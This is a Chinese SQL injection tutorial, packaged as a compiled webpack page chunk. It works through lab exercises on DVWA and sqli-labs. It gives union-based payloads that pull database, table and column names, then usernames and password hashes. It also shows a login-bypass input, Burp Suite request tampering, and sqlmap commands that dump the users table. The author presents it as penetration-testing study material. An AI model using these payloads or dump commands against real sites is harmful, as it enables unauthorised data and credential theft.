(window.webpackJsonp=window.webpackJsonp||[]).push([[120],{653:function(s,t,a){"use strict";a.r(t);var e=a(35),r=Object(e.a)({},(function(){var s=this,t=s.$createElement,a=s._self._c||t;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"sql注入"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sql注入"}},[s._v("#")]),s._v(" sql注入")]),s._v(" "),a("h3",{attrs:{id:"sql注入简介"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sql注入简介"}},[s._v("#")]),s._v(" sql注入简介")]),s._v(" "),a("p",[s._v("Sql 注入攻击是通过将恶意的 Sql 查询或添加语句插入到应用的输入参数中，再在后台 Sql 服务器上解析执行进行的攻击，它目前黑客对数据库进行攻击的最常用手段之一 。")]),s._v(" "),a("h3",{attrs:{id:"sql注入原理"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sql注入原理"}},[s._v("#")]),s._v(" Sql注入原理")]),s._v(" "),a("p",[s._v("数据如注入漏洞，主要指的开发人员在构建代码的时候，没有对输入边界进行安全考虑，导致攻击者可以通过合法的输入点提交一些精心构造的语句，从而欺骗后台数据库对其执行，导致数据库泄露的一种漏洞")]),s._v(" "),a("h3",{attrs:{id:"判断是否存在-sql-注入漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#判断是否存在-sql-注入漏洞"}},[s._v("#")]),s._v(" 判断是否存在 Sql 注入漏洞")]),s._v(" "),a("p",[s._v("通常情况下，可能存在 Sql 注入漏洞的 Url 是类似这种形式 ："),a("code",[s._v("http://xxx.xxx.xxx/abcd.php?id=XX")])]),s._v(" "),a("p",[s._v("1.可控参数的改变是否影响页面显示结果")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("?id=1     \n?id=2\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("2.最为经典的"),a("strong",[s._v("单引号判断法")]),s._v("：\n在参数后面加上单引号,比如:")]),s._v(" "),a("div",{staticClass:"language-cpp line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-cpp"}},[a("code",[s._v("http"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(":")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//xxx.xxx.xxx/abcd.php?id=4'")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("如果页面返回错误，则存在 Sql 注入，原因是无论字符型还是整型都会因为单引号个数不匹配而报错")]),s._v(" "),a("p",[s._v("可通过添加注释%2判断是整型还是字符型：")]),s._v(" "),a("p",[s._v("以sqli-labs less 1为例子")]),s._v(" "),a("p",[s._v("输入"),a("code",[s._v("id=1'")]),s._v(",报错，说明此处可能存在注入")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/akAGX5SIdWufQHc.png",alt:"1633530744471"}})]),s._v(" "),a("p",[s._v("输入id=1'%23，发现页面显示正常")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/qc5pb3SZlFYDKrm.png",alt:"1633531074888"}})]),s._v(" "),a("p",[s._v("继续注入，id=1' and 1=1%23页面显示正常，id=1' and 1=2%23页面显示不正常")]),s._v(" "),a("p",[s._v("%23注释了后面的sql语句，闭合了sql语句中的单引号，由此可判断出为字符型（单引号）")]),s._v(" "),a("h3",{attrs:{id:"注入流程"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#注入流程"}},[s._v("#")]),s._v(" 注入流程")]),s._v(" "),a("p",[s._v("获取字段数→查库名→查表名→查列名→查数据")]),s._v(" "),a("p",[s._v("1.获取字段数：order by 获取 字段临界值")]),s._v(" "),a("p",[s._v("2.获取库名：database()")]),s._v(" "),a("p",[s._v("3.查询表名和列名：")]),s._v(" "),a("p",[s._v("查表名：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("SELECT TABLE_NAME from information_schema.tables where TABLE_SCHEMA = dabatase() #数据库名\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("查列名：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("SELECT COLUMN_NAME FROM information_schema.columns where TABLE_NAME ='users'\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("备注：information_schema数据库里有三个表是sql注入需要用到的")]),s._v(" "),a("p",[s._v("SCHEMATA 表 SCHEMA_NAME储存了所有数据库的名字")]),s._v(" "),a("p",[s._v("TABLES 表TABLE_SCHEMA和TABLE_NAME分别储存了所有的数据库名称以及所有数据库的表")]),s._v(" "),a("p",[s._v("COLUMNS表 TABLE_SCHEMA、TABLE_NAME 、COLUMN_NAME 分别储存了所有的数据库名称、所有数据库的表、表里所有的字段")]),s._v(" "),a("h3",{attrs:{id:"常见的注入类型"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#常见的注入类型"}},[s._v("#")]),s._v(" 常见的注入类型")]),s._v(" "),a("p",[s._v("数字型 user_id = $id")]),s._v(" "),a("p",[s._v("字符型 user_id ='$id'")]),s._v(" "),a("h3",{attrs:{id:"sql注入实例一-字符型-单引号"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sql注入实例一-字符型-单引号"}},[s._v("#")]),s._v(" sql注入实例一：字符型（单引号）")]),s._v(" "),a("p",[s._v("使用DVWA渗透测试平台，作为攻击测试的目标。")]),s._v(" "),a("p",[s._v("靶场地址：http://1.14.43.183:11081/login.php")]),s._v(" "),a("p",[s._v("1.输入1，查看回显（URL中ID=1，说明php页面通过get方法传递参数）")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/cDeI3KASOZFGbzp.png",alt:"1633507029482"}})]),s._v(" "),a("p",[s._v("2.点击view source查看源代码，查看后台执行的sql语句")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/yeSIhgZW6LjDJnF.png",alt:"1633507227389"}})]),s._v(" "),a("p",[s._v("3.可以看到，输入1的时候，实际执行的sql语句是：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("SELECT first_name, last_name FROM users WHERE user_id = '1';\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("输入"),a("code",[s._v("1' or 1=1#")]),s._v("：")]),s._v(" "),a("p",[s._v("返回这个表的全部数据，因为1=1恒定为真")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/wdPygOEknNm8zW6.png",alt:"1633516048393"}})]),s._v(" "),a("p",[s._v("4.通过控制参数id来返回我们需要的信息，输入框中输入1' order by 1#，查看返回的First name、Surname")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/YKrd4aVzFtPN6kQ.png",alt:"1633507650516"}})]),s._v(" "),a("p",[s._v("实际后台执行的sql语句变成：")]),s._v(" "),a("p",[s._v("查询users表中user_id为1的数据并按第一字段排行")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("SELECT first_name, last_name FROM "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("users")]),s._v(" WHERE user_id "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'1'")]),s._v(" order by "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#';")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("按照Mysql语法，"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#后面会被注释掉，使用这种方法屏蔽掉后面的单引号，避免语法错误)")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("5.继续尝试输入 "),a("code",[s._v("1' order by 1#")]),s._v("和 "),a("code",[s._v("1' order by 2#")]),s._v(" ，一直到"),a("code",[s._v("1' order by 3#")]),s._v(" ， 当输入 "),a("code",[s._v("1' order by 3#")]),s._v("时，返回错误：")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/jBlwYtJeXn8s2QL.png",alt:"1633507984223"}})]),s._v(" "),a("p",[s._v("由此可知，users表中只有两个字段，列数为2")]),s._v(" "),a("p",[s._v("6.使用union select联合查询继续获取信息")]),s._v(" "),a("p",[s._v("union 运算符可以将两个或两个以上 select 语句的查询结果集合合并成一个结果集合显示，即执行联合查询。需要注意在使用 union 查询的时候需要和主查询的列数相同，而我们之前已经知道了主查询列数为 2")]),s._v(" "),a("p",[s._v("输入 "),a("code",[s._v("1' union select database(),1#")]),s._v("进行查询")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/3hYTOipyE1DrJqm.png",alt:"1633517538951"}})]),s._v(" "),a("ul",[a("li",[s._v("database()将会返回当前网站所使用的数据库名字")])]),s._v(" "),a("p",[s._v("实际执行的sql语句：")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("SELECT first_name, last_name FROM "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("users")]),s._v(" WHERE user_id "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'1'")]),s._v(" union "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" database"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(",1"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#`;")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("我们成功获取到：")]),s._v(" "),a("ul",[a("li",[s._v("当前网站使用数据库为 dvwa")])]),s._v(" "),a("p",[s._v("获取了数据库名dvwa后尝试获取数据库中的表名输入：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("'1' union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#'\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("mysql5.0后系统内置了information_schema数据库，information_schema 用于存储数据库元数据(关于数据的数据)，例如数据库名、表名、列的数据类型、访问权限等")]),s._v(" "),a("p",[s._v("该数据库拥有一个名为 tables 的数据表，该表包含两个字段 table_name 和 table_schema，分别记录存储的表名和表名所在的数据库")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/YGNdzKlMnZVtjpb.png",alt:"1633509769805"}})]),s._v(" "),a("p",[s._v("实际执行的sql语句：")]),s._v(" "),a("div",{staticClass:"language-csharp line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-csharp"}},[a("code",[a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("ELECT")]),s._v(" first_name"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" last_name FROM users "),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("WHERE")]),s._v(" user_id "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token char"}},[s._v("'1'")]),s._v(" union "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" table_name"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("table_schema "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" information_schema"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("tables "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("where")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token class-name"}},[s._v("table_schema")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" 'dvwa'#`"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("共获取到dvwa数据库的两个表，geuestbook以及users")]),s._v(" "),a("p",[s._v("接下来尝试获取用户名、密码，输入以下获取users表里的所有字段：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("1' union select column_name,table_name from information_schema.columns where table_name = 'users' #\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/Neb5d6ZE8S2flMB.png",alt:"1633517872147"}})]),s._v(" "),a("p",[s._v("获取到有两个字段user,password是我们需要的，所以输入："),a("code",[s._v("1' union select user,password from users#")]),s._v("进行查询 ：")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/ObjtKx587nSTvPw.png",alt:"1633510187314"}})]),s._v(" "),a("p",[s._v("可以看到成功爆出用户名、密码，密码采用 md5 进行加密，可以到"),a("code",[s._v("www.cmd5.com")]),s._v("进行解密 ，可以尝试是否能够登录成功")]),s._v(" "),a("h3",{attrs:{id:"sql注入实例二-整型注入"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sql注入实例二-整型注入"}},[s._v("#")]),s._v(" sql注入实例二：整型注入")]),s._v(" "),a("p",[s._v("以sqli-labs less 2举例。")]),s._v(" "),a("p",[s._v("1.首先根据提示，输入"),a("code",[s._v("id=1")]),s._v(",查看回显")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/nZusk6UV48HSoqT.png",alt:"1633524664616"}})]),s._v(" "),a("p",[s._v("2.加上单引号，输入"),a("code",[s._v("id=1'")]),s._v(" 页面返回错误，存在sql注入")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/Z4r97lw8osOfjAh.png",alt:"1633524744128"}})]),s._v(" "),a("p",[s._v("3.使用order by判断表字段的最大值 当输入"),a("code",[s._v("id=1 order by 4%23")]),s._v("，由此可知，该表有3个字段，为3列")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/XWrKfq19pkDe7lg.png",alt:"1633530288294"}})]),s._v(" "),a("p",[s._v("4.获取当前数据库，输入"),a("code",[s._v("id=12222 union select 1,2,database()%23")]),s._v("，由于页面显示限制，只显示第一行数据，输入id=12222使得前一条查询语句不显示（可以使用不存在的数或者加and 0）")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/8nX1EecxIkTbofs.png",alt:"1633530314199"}})]),s._v(" "),a("p",[s._v("5.获取当前数据库的所有表,输入以下：")]),s._v(" "),a("div",{staticClass:"language-text line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("id=1222 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()%23\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/kI2PAzYLDm8WG5c.png",alt:"1633530334370"}})]),s._v(" "),a("p",[s._v("备注：group_concat()拼接所有列")]),s._v(" "),a("p",[s._v("6.获取我们想要users表的字段，输入以下,得到users表的字段为id,username,password：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("id=1222 union select 1,2,group_concat(column_name) from information_schema.columns where table_name = 'users'%23\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/QSl2DXfo7uPzNaM.png",alt:"1633530354562"}})]),s._v(" "),a("p",[s._v("7.获取username,password，输入以下：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("id=12222 union select 1,group_concat(username),group_concat(password) from users%23\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/qkSNl8b3ZVBaDzh.png",alt:"1633530376447"}})]),s._v(" "),a("p",[s._v("可以使用concat_ws()将uername,password拼接展示：")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("id=121343 union select 1,group_concat(concat_ws(':',username,password)),3 from security.users%23\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/kURNTxqgMFwB1sz.png",alt:"1633530394700"}})]),s._v(" "),a("h3",{attrs:{id:"sql注入实例三-post注入-登录绕过"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sql注入实例三-post注入-登录绕过"}},[s._v("#")]),s._v(" sql注入实例三：POST注入（登录绕过）")]),s._v(" "),a("p",[s._v("以sqli-labs less-11为例。")]),s._v(" "),a("p",[s._v("1.查看该网页html部分，获取到form表单采用post形式提交，需要提交passwd和uname两个参数")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/4LjYChHetETflUR.png",alt:"image-20211007005445731"}})]),s._v(" "),a("p",[s._v("2.可大致推断数据库的sql语句为")]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("select username,password from users where uname=用户名&passwd=密码\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("3.在Less1-4中，我们正常访问需要 ?id=xxx而这里需要 uname=用户名&passwd=密码")]),s._v(" "),a("p",[s._v("同理：?id=1'       类似于 uname=1&passwd=1'，username输出1'，根据报错可知，还是字符型单引号注入")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/5Gl37swQaZLXecy.png",alt:"image-20211007010321441"}})]),s._v(" "),a("p",[s._v("4.username输入1' or 1#，登录成功，确定是一个注册点")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/EZ1B3HezCTSPG9D.png",alt:"image-20211007010547170"}})]),s._v(" "),a("p",[s._v("5.获取字段数，order by 在这里是行不通的，因为1' order by 1 数据库中根本没有用户名为1的用户（真的有当我没说），可以使用-1' union select 1,2# 使得前一个条件为false直接执行后面的select语句，结果返回用户名和密码可以确定字段数，username输入"),a("code",[s._v("-1' union select 1,2#")]),s._v("返回用户名和密码，username输入"),a("code",[s._v("-1' union select 1,2,3#")]),s._v("报错，可以确定字段数为2")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/SyXAFZE4v8iPLYJ.png",alt:"image-20211007011308470"}})]),s._v(" "),a("p",[s._v("6.获得当前数据库名，username输入"),a("code",[s._v("-1' union select 1,database()#")]),s._v("，当前数据库为security")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/eaiC2LhIr1P5l9g.png",alt:"image-20211007011440900"}})]),s._v(" "),a("p",[s._v("7.获取当前数据库所有的表，username输入"),a("code",[s._v("-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema =database()#")])]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/dKiH6t9yWbQrnAz.png",alt:"image-20211007011733506"}})]),s._v(" "),a("p",[s._v("8.获取users表的字段，username输入"),a("code",[s._v("-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' and table_schema=database()#")])]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/kcd9ALjiUTtIHQ2.png",alt:"image-20211007012009476"}})]),s._v(" "),a("p",[s._v("9."),a("code",[s._v("-1' union select group_concat(password),group_concat(username) from users#")]),s._v("获取用户名、密码")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/CuWtJKarBzoYMs1.png",alt:"image-20211007012213348"}})]),s._v(" "),a("h3",{attrs:{id:"使用burpsuite工具进行注入"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#使用burpsuite工具进行注入"}},[s._v("#")]),s._v(" 使用BurpSuite工具进行注入")]),s._v(" "),a("p",[a("strong",[s._v("BurpSuite的核心是代理Proxy")]),s._v("，通常情况下使用BurpSuite的套路是：浏览器设置BurpSuite代理→访问Web应用程序→BurpSuite抓包分析")]),s._v(" "),a("p",[s._v("还是以sqli-labs less-11为例。")]),s._v(" "),a("p",[s._v("1.查看brupsuite默认代理，默认代理端口为8080，可能会和tomcat冲突，可以自行修改")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/FDVo4JR7wsaBKZC.png",alt:"image-20211007115618655"}})]),s._v(" "),a("p",[s._v("2.修改浏览器代理端口，这里使用的是Chrome")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/cvawVWKCygSJobl.png",alt:"image-20211007115758858"}})]),s._v(" "),a("p",[s._v("3.简单介绍burpsuite基本功能")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/Ne5D3iu6anLJASX.png",alt:"image-20211007120424375"}})]),s._v(" "),a("p",[s._v("4.在less-11username 输入框中输入1'进行测试，查看burpsuite的拦截")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/f5Y8dJEQnljKgu1.png",alt:"image-20211007120818457"}})]),s._v(" "),a("p",[s._v("5.修改注入点提交到服务器，可以看到页面已经显示了用户名和密码")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/ZNR3J9QYiKtcDUI.png",alt:"image-20211007121119623"}})]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/3P8dDKsCM2rt6WX.png",alt:"image-20211007120950123"}})]),s._v(" "),a("p",[s._v("6.这样操作其实有点繁琐，可以将拦截到的包发送到Repter，每一次修改语句直接Go一次，右边会直接返回结果，不必每次修改语句就抓一次包")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/XBDpmQq3dvKyLHx.png",alt:"image-20211007121247201"}})]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/5apt4smxERurNzj.png",alt:"image-20211007121417635"}})]),s._v(" "),a("p",[s._v("7.从返回的一部分语句中可以看出是字符型单引号注入，猜测查询语句为：")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/iKThIvAcymWXBob.png",alt:"image-20211007122311851"}})]),s._v(" "),a("div",{staticClass:"language- line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-text"}},[a("code",[s._v("SELECT USERNAME,PASSWORD FROM TABLE_NAME WHERE USERNAME='$_POST['uname']' AND'$_POST['passwd']' limit 0,1\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("8.实际操作和示例三一样，首先使用union select判断字段数，再获取数据库名、表名、字段名")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/xQZzJso5Tb7ldG1.png",alt:"image-20211007123006450"}})]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/h2oDP16MmzkV8Lt.png",alt:"image-20211007123029831"}})]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/jPVKkgl6SZxHMhX.png",alt:"image-20211007123058790"}})]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/RexonZPqak6cIzy.png",alt:"image-20211007123247279"}})]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/RjegQW2rtYFPLoN.png",alt:"image-20211007123345273"}})]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/07/6GmFIBqzT2WhUDp.png",alt:"image-20211007123447169"}})]),s._v(" "),a("h3",{attrs:{id:"使用sqlmap进行自动化注入"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#使用sqlmap进行自动化注入"}},[s._v("#")]),s._v(" 使用sqlmap进行自动化注入")]),s._v(" "),a("h4",{attrs:{id:"sqlmap注入实例一"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sqlmap注入实例一"}},[s._v("#")]),s._v(" sqlmap注入实例一：")]),s._v(" "),a("p",[s._v("以sqlib-labs less-1举例。")]),s._v(" "),a("p",[s._v("1.输入id=1',根据报错可判断出为字符型单引号注入")]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/08/CK47QHk9tmLdYo1.png",alt:"image-20211008160913473"}})]),s._v(" "),a("p",[s._v("2.猜测sql语句大概为")]),s._v(" "),a("p",[a("code",[s._v("select password,username from 表名 where id = 参数 LIMIT 0,1")])]),s._v(" "),a("p",[s._v("2.-u参数，一共发现四种类型注入（-u #注入点）")]),s._v(" "),a("p",[a("code",[s._v('python3 sqlmap.py -u "http://1.14.43.183:11080/Less-1/?id=1"')])]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/08/6bU37lwCRsiY8oE.png",alt:"image-20211008161812468"}})]),s._v(" "),a("ol",{attrs:{start:"3"}},[a("li",[s._v("-dbs参数爆数据库获取到全部数据库，也可以用-current-db获取当前数据库名称")]),s._v(" "),a("li",[a("code",[s._v('python3 sqlmap.py -u "http://1.14.43.183:11080/Less-1/?id=1" -dbs')])])]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/08/n1dqXyN3SfTQrt7.png",alt:"image-20211008162145241"}})]),s._v(" "),a("ol",{attrs:{start:"4"}},[a("li",[s._v("-tables参数爆表（-D 指定数据库名）")])]),s._v(" "),a("p",[a("code",[s._v('python3 sqlmap.py -u "http://1.14.43.183:11080/Less-1/?id=1" -D security -tables')])]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/08/jAU1VPxCNnJWY2e.png",alt:"image-20211008162504352"}})]),s._v(" "),a("p",[s._v("5.-columns爆列（-T 指定表名）")]),s._v(" "),a("p",[a("code",[s._v('python3 sqlmap.py -u "http://1.14.43.183:11080/Less-1/?id=1" -D security -T users -columns')])]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/08/5RyImbrW3OLM4Qi.png",alt:"image-20211008162707350"}})]),s._v(" "),a("ol",{attrs:{start:"6"}},[a("li",[s._v("-dump爆数据（-C 指定字段）")])]),s._v(" "),a("p",[a("code",[s._v('python3 sqlmap.py -u "http://1.14.43.183:11080/Less-1/?id=1" -D security -T users -C id,username,password -dump')])]),s._v(" "),a("p",[a("img",{attrs:{src:"https://i.loli.net/2021/10/08/6Xo1Jr2HYBR3i4Z.png",alt:"image-20211008162857905"}})]),s._v(" "),a("h4",{attrs:{id:"sqlmap注入实例二"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#sqlmap注入实例二"}},[s._v("#")]),s._v(" sqlmap注入实例二：")]),s._v(" "),a("p",[s._v("以DVWA为例。")]),s._v(" "),a("p",[s._v("1.DVWA是需要登录的，需要加上登录使用的cookie，由前面可知，注入点为"),a("code",[s._v("http://1.14.43.183:11081/vulnerabilities/sqli/?id=1&Submit=Submit#")])]),s._v(" "),a("p",[s._v("2.-u参数，加上--cookie")]),s._v(" "),a("p",[a("code",[s._v('python3 sqlmap.py -u "http://1.14.43.183:11081/vulnerabilities/sqli/?id=1&Submit=Submit#" --cookie=PHPSESSID=8l8ujegpqapm7jr5hqcpr5gck3;security=low')])]),s._v(" "),a("p",[s._v("3.接下来的步骤和实例一没什么区别")])])}),[],!1,null,null,null);t.default=r.exports}}]);